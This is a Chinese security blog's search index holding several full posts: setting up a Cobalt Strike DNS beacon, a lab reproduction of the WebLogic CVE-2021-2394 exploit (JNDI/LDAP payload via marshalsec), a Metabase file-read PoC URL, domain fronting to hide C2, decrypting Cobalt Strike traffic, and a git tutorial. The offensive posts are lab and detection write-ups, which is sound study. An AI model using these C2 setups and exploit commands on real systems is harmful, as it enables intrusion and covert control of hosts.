<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CS_DNS_Beacon</title>
    <url>/CS-DNS-Beacon/</url>
    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ul>
<li><p>Cobalt strike4.4</p>
</li>
<li><p>VPS（服务器）</p>
</li>
<li><p>域名</p>
</li>
</ul>
<h2 id="二、域名解析配置"><a href="#二、域名解析配置" class="headerlink" title="二、域名解析配置"></a>二、域名解析配置</h2><p>一条A记录，一条NS记录</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519163940795.png" alt="image-20220519163940795"></p>
<h3 id="1、申请一个域名"><a href="#1、申请一个域名" class="headerlink" title="1、申请一个域名"></a>1、申请一个域名</h3><p>​    【WWW.XX#X.TK]</p>
<h3 id="2、配置解析记录"><a href="#2、配置解析记录" class="headerlink" title="2、配置解析记录"></a>2、配置解析记录</h3><p>​    此次使用的是CDN配置</p>
<p>​    地址：<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NS记录：NS1  NS1.xxx.tk WWW.xxx.tk </span><br><span class="line"></span><br><span class="line">A记录： A     WWW.xxx.tk   IP</span><br></pre></td></tr></table></figure>

<h3 id="3、等待生效"><a href="#3、等待生效" class="headerlink" title="3、等待生效"></a>3、等待生效</h3><p>​    时间比较久</p>
<h2 id="三、CS-DNS-Beacon"><a href="#三、CS-DNS-Beacon" class="headerlink" title="三、CS DNS Beacon"></a>三、CS DNS Beacon</h2><h3 id="1、VPS运行服务端"><a href="#1、VPS运行服务端" class="headerlink" title="1、VPS运行服务端"></a>1、VPS运行服务端</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;teamserver  VPS-IP Password</span><br><span class="line">#注意53端口，如存在服务，需要关闭 netstat -ano | grep 53</span><br></pre></td></tr></table></figure>



<h3 id="2、本地机器添加监听"><a href="#2、本地机器添加监听" class="headerlink" title="2、本地机器添加监听"></a>2、本地机器添加监听</h3><p>DNS-HOSTS 使用的是NS的域名</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519165639252.png" alt="image-20220519165639252"></p>
<h3 id="3、生成木马"><a href="#3、生成木马" class="headerlink" title="3、生成木马"></a>3、生成木马</h3><p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519165859802.png" alt="image-20220519165859802"></p>
<h3 id="4、上线"><a href="#4、上线" class="headerlink" title="4、上线"></a>4、上线</h3><p>​    目标机执行木马，但默认情况下主机信息是黑色，需要执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checkin </span><br><span class="line">mode dns-txt</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519170235965.png" alt="image-20220519170235965"></p>
<h2 id="四、CS上线流量特征"><a href="#四、CS上线流量特征" class="headerlink" title="四、CS上线流量特征"></a>四、CS上线流量特征</h2><p>​    受害机器发送大量的请求包，并且很多流量包中请求和响应的的域名较长</p>
<ul>
<li>过滤查询域名长度超过一定数值时判定为可疑</li>
<li>大量请求同一个二级域名，并且查询结果为0.0.0.0，查询状态为成功</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220519171432350.png" alt="image-20220519171432350"></p>
]]></content>
      <categories>
        <category>安全</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-2394</title>
    <url>/CVE-2021-2394/</url>
    <content><![CDATA[<h1 id="CVE-2021-2394"><a href="#CVE-2021-2394" class="headerlink" title="CVE-2021-2394"></a>CVE-2021-2394</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a><strong>一、简介</strong></h2><p>​    oracle公司在2021年7月重要补丁更新报告中，通告中披露了WebLogic组件存在高危漏洞，攻击者可以在未授权的情况下通过IIOP、T3协议对存在漏洞的WebLogic Server组件进行攻击。成功利用该漏洞的攻击者可以接管WebLogic Server。</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
<h2 id="二、复现环境："><a href="#二、复现环境：" class="headerlink" title="二、复现环境："></a><strong>二、复现环境：</strong></h2><p><strong>平台：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	windows 10 </span><br><span class="line">​	kali2021</span><br></pre></td></tr></table></figure>



<p><strong>工具：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	jdk8  (注意，安装目录不可有空格） </span><br><span class="line">​	weblogic_12.2.1.3.0</span><br><span class="line">​	maven3.8.2 </span><br><span class="line">​	marshalsec </span><br><span class="line">​	exp </span><br><span class="line">​	python3</span><br></pre></td></tr></table></figure>



<h2 id="三、受影响版本"><a href="#三、受影响版本" class="headerlink" title="三、受影响版本"></a><strong>三、受影响版本</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	Oracle WebLogic Server 10.3.6.0.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.1.3.0.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.2.1.3.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.2.1.4.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 14.1.1.0.0</span><br></pre></td></tr></table></figure>


<h2 id="四、修复方式"><a href="#四、修复方式" class="headerlink" title="四、修复方式"></a><strong>四、修复方式</strong></h2><p>官方已发布补丁。</p>
<p>官方下载链接：<a href="https://www.oracle.com/security-alerts/cpuapr2021.html">https://www.oracle.com/security-alerts/cpuapr2021.html</a></p>
<h2 id="五、复现过程"><a href="#五、复现过程" class="headerlink" title="五、复现过程"></a><strong>五、复现过程</strong></h2><h3 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a><strong>1、安装</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar fmw_12.2.1.3.0_wls.jar</span><br></pre></td></tr></table></figure>



<p>安装过程如环境搭建文档，下载weblogic 12.2.1.3.0并安装</p>
<p><img src= "/img/loading.gif" data-lazy-src="CVE-2021-2394/img/clipboard.png" alt="img"></p>
<h3 id="2、-攻击机-创建Exploit-java，通过javac编译得到Exploit-class"><a href="#2、-攻击机-创建Exploit-java，通过javac编译得到Exploit-class" class="headerlink" title="**2、[攻击机]**创建Exploit.java，通过javac编译得到Exploit.class"></a>**2、[攻击机]**创建Exploit.java，通过javac编译得到Exploit.class</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac Exploit.java   // 编译</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Exploit.class </span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;     </span><br><span class="line">    <span class="keyword">static</span> &#123;        </span><br><span class="line">        System.err.println(<span class="string">&quot;Pwned&quot;</span>);        </span><br><span class="line">        <span class="keyword">try</span> &#123;            </span><br><span class="line">            String cmds = <span class="string">&quot;calc&quot;</span>;            					         			 Runtime.getRuntime().exec(cmds);  <span class="comment">//执行命令        </span></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;           </span><br><span class="line">            e.printStackTrace();        </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="3、-攻击机-jar目录下-使用python开启一个http服务，并使用marshalsec开启JNDI服务"><a href="#3、-攻击机-jar目录下-使用python开启一个http服务，并使用marshalsec开启JNDI服务" class="headerlink" title="**3、[攻击机]**jar目录下 使用python开启一个http服务，并使用marshalsec开启JNDI服务"></a>**3、[攻击机]**jar目录下 使用python开启一个http服务，并使用marshalsec开启JNDI服务</h3><p><strong>下载</strong>marshalsec工具</p>
<p><code>https://github.com/mbechler/marshalsec </code></p>
<p><strong>编译</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>



<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
<h3 id="4、开启PYTHON服务【marshalsec-jar目录下】"><a href="#4、开启PYTHON服务【marshalsec-jar目录下】" class="headerlink" title="4、开启PYTHON服务【marshalsec.jar目录下】"></a><strong>4、开启PYTHON服务【marshalsec.jar目录下】</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
<p><strong>开启JNDI服务【marshalsec.jar目录下】</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;192.168.24.129:8000&#x2F;#Exploit&quot; 8087</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/1629912643.png" alt="1629912643"></p>
<h3 id="5、-攻击机-下载EXP"><a href="#5、-攻击机-下载EXP" class="headerlink" title="5、[攻击机]下载EXP"></a><strong>5、[攻击机]下载EXP</strong></h3><p><code>https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0</code></p>
<p>运行【一条命令】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar CVE_2021_2394.jar 192.168.24.132 7001 ldap:&#x2F;&#x2F;192.168.24.129:8087&#x2F;Exploit</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
<p>攻击成功</p>
<h2 id="六、流量"><a href="#六、流量" class="headerlink" title="六、流量"></a><strong>六、流量</strong></h2><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1630462621155.png" alt="clipboard-1630462621155"></p>
<p>第一条流量</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1630462633173.png" alt="clipboard-1630462633173"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Metabasegeojson任意文件读取漏洞CVE-2021-41277</title>
    <url>/CVE-2021-41277-Metabasegeojson%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Metabasegeojson任意文件读取漏洞CVE-2021-41277"><a href="#Metabasegeojson任意文件读取漏洞CVE-2021-41277" class="headerlink" title="Metabasegeojson任意文件读取漏洞CVE-2021-41277"></a>Metabasegeojson任意文件读取漏洞CVE-2021-41277</h1><h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>​    在受影响的版本中，自定义 GeoJSON 地图（admin-&gt;settings-&gt;maps-&gt;custom maps-&gt;add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
<li><strong>metabase version &lt; 0.40.5</strong></li>
<li><strong>metabase version &gt;= 1.0.0, &lt; 1.40.5</strong></li>
</ul>
<h3 id="1、fofa-so搜索"><a href="#1、fofa-so搜索" class="headerlink" title="1、fofa.so搜索"></a>1、fofa.so搜索</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Metabase geojson&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004406584.png" alt="image-20220219004406584"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;IP&#x2F;api&#x2F;geojson?url&#x3D;file:xxxxx</span><br></pre></td></tr></table></figure>



<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004247065.png" alt="image-20220219004247065"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
        <category>Metabasegeojson</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike使用已知私钥或进程解密</title>
    <url>/CobaltStrike%E4%BD%BF%E7%94%A8%E5%B7%B2%E7%9F%A5%E7%A7%81%E9%92%A5%E6%88%96%E8%BF%9B%E7%A8%8B%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p>原文：</p>
<p><a href="https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/">https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/</a></p>
<h2 id="一、Cobalt-Strike-公钥和私钥"><a href="#一、Cobalt-Strike-公钥和私钥" class="headerlink" title="一、Cobalt Strike 公钥和私钥"></a><em><strong>一、Cobalt Strike 公钥和私钥</strong></em></h2><p>Cobalt Strike 信标（客户端）和 Cobalt Strike 团队服务器 (C2) 之间的通信使用 AES 加密（即使它通过 HTTPS 进行）</p>
<p>公钥和私钥存储在文件 .cobaltstrike.beacon_keys 中。这些密钥是在首次使用 Cobalt Strike 团队服务器软件时生成的。</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps20.jpg" alt="img"> </p>
<h2 id="二、使用"><a href="#二、使用" class="headerlink" title="二、使用"></a>二、使用</h2><p>捕获文件：使用文章中的数据包进行测试。</p>
<p>数据包：<a href="https://www.malware-traffic-analysis.net/2021/02/02/index.html">https://www.malware-traffic-analysis.net/2021/02/02/index.html</a></p>
<h3 id="第一步-找到信标"><a href="#第一步-找到信标" class="headerlink" title="第一步 找到信标"></a><em><strong>第一步 找到信标</strong></em></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http.request.uri matches &quot;...$&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps21.jpg" alt="img"> </p>
<h3 id="第二步-查看是否是CS生成的shellcode"><a href="#第二步-查看是否是CS生成的shellcode" class="headerlink" title="第二步 查看是否是CS生成的shellcode"></a>第二步 查看是否是CS生成的shellcode</h3><p>Metasploit 和 Cobalt Strike 为 http(s) shell 生成 shellcode。在这个 shellcode 中找到的 URL 有一个由 4 个随机字母数字字符组成的路径。但它们并不是完全随机的：它们的 8 位校验和是一小组常数.</p>
<p>使用metatool.py工具进行检查</p>
<p><a href="https://blog.didierstevens.com/2021/04/18/metatool-py/">https://blog.didierstevens.com/2021/04/18/metatool-py/</a></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps22.jpg" alt="img"> </p>
<h3 id="第三步-将beacon转化成vir文件"><a href="#第三步-将beacon转化成vir文件" class="headerlink" title="第三步 将beacon转化成vir文件"></a>第三步 将beacon转化成vir文件</h3><p>l 完整信标的下载被捕获：</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps23.jpg" alt="img"> </p>
<p>l 提取并下载</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps24.jpg" alt="img"> </p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps25.jpg" alt="img"> </p>
<h3 id="第四步、使用工具-1768-py对其进行分析"><a href="#第四步、使用工具-1768-py对其进行分析" class="headerlink" title="第四步、使用工具 1768.py对其进行分析"></a>第四步、使用工具 1768.py对其进行分析</h3><p><a href="https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/">https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/</a></p>
<p>1768.py 是一个可以解码/解密 Cobalt Strike beacon并提取其配置的工具</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps26.jpg" alt="img"> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0001 表明这是一个通过 HTTPBeacon 进行通信的 </span><br><span class="line"></span><br><span class="line">0x0002 表明使用端口 8080</span><br><span class="line"></span><br><span class="line">0x0003 表明是睡眠时间是60s</span><br><span class="line"></span><br><span class="line">0x0005 表明抖动系数为 0%</span><br><span class="line"></span><br><span class="line">0x0007 使用的公钥</span><br><span class="line"></span><br><span class="line">0x0008 表明使用服务器 192.254.79.71</span><br><span class="line"></span><br><span class="line">0x0008 表明 GET 请求使用 &#x2F;ptj</span><br><span class="line"></span><br><span class="line">0x000a 表明 POST 请求使用 &#x2F;submit.php</span><br><span class="line"></span><br><span class="line">0x000b 表明解密之前不对数据执行任何操作</span><br></pre></td></tr></table></figure>



<p><a href="https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/">https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/</a></p>
<p>解密的元数据及原始密钥：caeab4f452fe41182d504aa24966fbd0。使用此密钥来解密流量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Python  cs-decrypt-metadata.py  [cookie]</span><br></pre></td></tr></table></figure>

<p>【此元数据使用信标配置中的公钥（选项 0x0007）进行 RSA 加密，私钥来自已经泄露的】</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps27.jpg" alt="img"> </p>
<h3 id="第六步-使用-cs-parse-http-traffic-py-解密流量"><a href="#第六步-使用-cs-parse-http-traffic-py-解密流量" class="headerlink" title="第六步 使用 cs-parse-http-traffic.py 解密流量"></a>第六步 使用 cs-parse-http-traffic.py 解密流量</h3><p>l 找到c2发送的命令 </p>
<p>数据包 6034 和 6703是信标本身的下载，并且通信未加密。因此，我们将使用以下显示过滤器过滤掉这些数据包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http and ip.addr &#x3D;&#x3D; 192.254.79.71 and frame.number &gt; 6703</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps28.jpg" alt="img"> </p>
<p>从第一个流开始，找到第一个有响应内容的</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps29.jpg" alt="img"> </p>
<p>l 使用工具 解析命令</p>
<p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py</a></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps30.jpg" alt="img"> </p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps31.jpg" alt="img"></p>
<h2 id="三、测试"><a href="#三、测试" class="headerlink" title="三、测试"></a>三、测试</h2><p>流量包来源：cs4.3  http</p>
<p>​    使用cs4.3打包进行测试是否可破解cs流量</p>
<h3 id="1、流量包"><a href="#1、流量包" class="headerlink" title="1、流量包"></a>1、流量包</h3><p>​    数据包样例</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps32.jpg" alt="img"> </p>
<h3 id="2、使用1768-py对其进行分析"><a href="#2、使用1768-py对其进行分析" class="headerlink" title="2、使用1768.py对其进行分析"></a>2、使用1768.py对其进行分析</h3><p>攻击机使用了HTTP的beacon，受害机会连接192.168.24.129的8888端口，GET请求路径是/ptj，POST请求路径是/submit.php</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps33.jpg" alt="img"> </p>
<h3 id="3、使用工具cs-decrypt-metadata-py来找到原始密钥-报错"><a href="#3、使用工具cs-decrypt-metadata-py来找到原始密钥-报错" class="headerlink" title="3、使用工具cs-decrypt-metadata.py来找到原始密钥  报错"></a>3、使用工具cs-decrypt-metadata.py来找到原始密钥  报错</h3><p>​    说明密钥可能错误，可以将自己的密钥配置近代码中</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps34.jpg" alt="img"> </p>
<p>使用进程内存解密流量</p>
<p><a href="https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/">https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/</a></p>
<h3 id="4、cs-parse-http-traffic-py提取此加密字符串"><a href="#4、cs-parse-http-traffic-py提取此加密字符串" class="headerlink" title="4、cs-parse-http-traffic.py提取此加密字符串"></a>4、cs-parse-http-traffic.py提取此加密字符串</h3><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py</a></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps35.jpg" alt="img"> </p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps36.jpg" alt="img"> </p>
<h3 id="5-DMP文件"><a href="#5-DMP文件" class="headerlink" title="5.DMP文件"></a>5.DMP文件</h3><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</a></p>
<p>使用tasklist找到进程PID </p>
<p>执行命令[将进程内容转储存成dmp文件]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procdump.exe -mp 3788[PID]</span><br></pre></td></tr></table></figure>



<h3 id="6、cs-extract-key-py获取密钥"><a href="#6、cs-extract-key-py获取密钥" class="headerlink" title="6、cs-extract-key.py获取密钥"></a>6、cs-extract-key.py获取密钥</h3><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py">https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py</a></p>
<p>元数据包含原始密钥：16 个随机字节。AES 和 HMAC 密钥是通过计算原始密钥的 SHA256 值从该原始密钥导出的。SHA256 值的前半部分是 HMAC 密钥，后半部分是 AES 密钥。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python cs-extract-key.py -t 加密字符串【4】 xxx.dmp</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps37.jpg" alt="img"> </p>
<h3 id="7、使用恢复的-AES-和-HMAC-密钥来解密流量"><a href="#7、使用恢复的-AES-和-HMAC-密钥来解密流量" class="headerlink" title="7、使用恢复的 AES 和 HMAC 密钥来解密流量"></a>7、使用恢复的 AES 和 HMAC 密钥来解密流量</h3><p><a href="https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py">https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Python cs-parse-http-traffic.py -k [sha256 ray key] pcap</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/wps38.jpg" alt="img"> </p>
]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>cs域前置隐藏</title>
    <url>/cs%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><h3 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h3><p>​    域前置（Domain fronting），是一种能够隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过 HTTPS 连接到被屏蔽的服务，而表面上像是在与另一个完全不同的站点通信。</p>
<p>​    因为在处理HTTPS请求时，CDN会首先将它解密，并根据HTTP Host的值做请求转发，所以用户想要访问一个非法网站，可以使用一个CDN上的合法的域名作为SNI（和TLS服务器名称指示），然后使用想要访问的网站作为HTTP Host与CDN进行HTTPS通信</p>
<h2 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h2><p>​    VPS服务器、域名</p>
<h3 id="1、添加CDN-A记录"><a href="#1、添加CDN-A记录" class="headerlink" title="1、添加CDN A记录"></a>1、添加CDN A记录</h3><p><a href="https://www.cloudflare.com/zh-cn/">https://www.cloudflare.com/zh-cn/</a></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614152757840.png" alt="image-20220614152757840"></p>
<h3 id="2、找到CDN后的IP"><a href="#2、找到CDN后的IP" class="headerlink" title="2、找到CDN后的IP"></a>2、找到CDN后的IP</h3><p><a href="https://dns.aizhan.com/">https://dns.aizhan.com/</a></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614153040493.png" alt="image-20220614153040493"></p>
<h3 id="3、找到使用相同CDN的域名"><a href="#3、找到使用相同CDN的域名" class="headerlink" title="3、找到使用相同CDN的域名"></a>3、找到使用相同CDN的域名</h3><p>可以通过asn来查询 </p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614153145329.png" alt="image-20220614153145329"></p>
<p>4、测试 curl 域前置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl www.aaa.com  -H &quot;Host:www.attack.com&quot; -v</span><br><span class="line">#curl &#x2F;&#x2F;相同CDN的域名  -H &quot;Host:C2的域名&quot; -v</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220615153804870.png" alt="image-20220615153804870"></p>
<ul>
<li>流量特征</li>
</ul>
<p>​    会话中的域名和HTTP内容中的HOST不相同，【如果是HTTPS将较好的隐藏】</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614161208780.png" alt="image-20220614161208780"></p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220614155701781.png" alt="image-20220614155701781"></p>
<h2 id="三、CS使用域前置"><a href="#三、CS使用域前置" class="headerlink" title="三、CS使用域前置"></a>三、CS使用域前置</h2><p>创建监听</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/clipboard-1655344821611.png" alt="img"></p>
<h2 id="四、流量"><a href="#四、流量" class="headerlink" title="四、流量"></a>四、流量</h2><p>域名和host值不相同</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/2/image-20220615154454798.png" alt="image-20220615154454798"></p>
]]></content>
      <categories>
        <category>安全</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>git将本地代码上传到远程仓库</title>
    <url>/git%E5%B0%86%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<p><strong>1.注册账户</strong><br><a href="https://github.com/">https://github.com/</a><br><strong>2.新建库</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091458521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091851782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>3.git下载</strong><br><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a><br><strong>4.安装</strong><br>       按提示安装</p>
<p><strong>5.查看ssh是否生成，如果没有</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;xxx@qq.com&quot;</span>  <span class="comment">#注册github时的邮箱</span></span><br></pre></td></tr></table></figure>

<p>如果显示没有这个命令，需要配置环境变量</p>
<pre><code>   添加git/bin的位置
</code></pre>
<p><strong>6.ssh生成后，在id_rsa.pub中，复制里面的 key。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<pre><code> 测试是否连接成功，
 出现hi 用户名  表示已成功
</code></pre>
<p><strong>7.设置用户名</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;name&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>8.设置邮箱</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">&quot;2xxxxxxxxxxx@qq.com&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>9.上传</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  <span class="comment">#把这个目录变成Git可以管理的仓库</span></span><br><span class="line">git init     </span><br><span class="line">  <span class="comment">#将全部文件添加到仓库</span></span><br><span class="line">git add .   </span><br><span class="line">  <span class="comment">#把文件提交到仓库  &quot;message_board&quot;文件名</span></span><br><span class="line">git commit -m “message_board”</span><br><span class="line">  <span class="comment">#关联远程仓库</span></span><br><span class="line">git remote add origin git@github.com:username/message_board.git</span><br><span class="line">  <span class="comment">#把本地库的所有内容推送到远程库上</span></span><br><span class="line">git push -u origin master </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>pagerank_algorithm</title>
    <url>/pagerank-algorithm/</url>
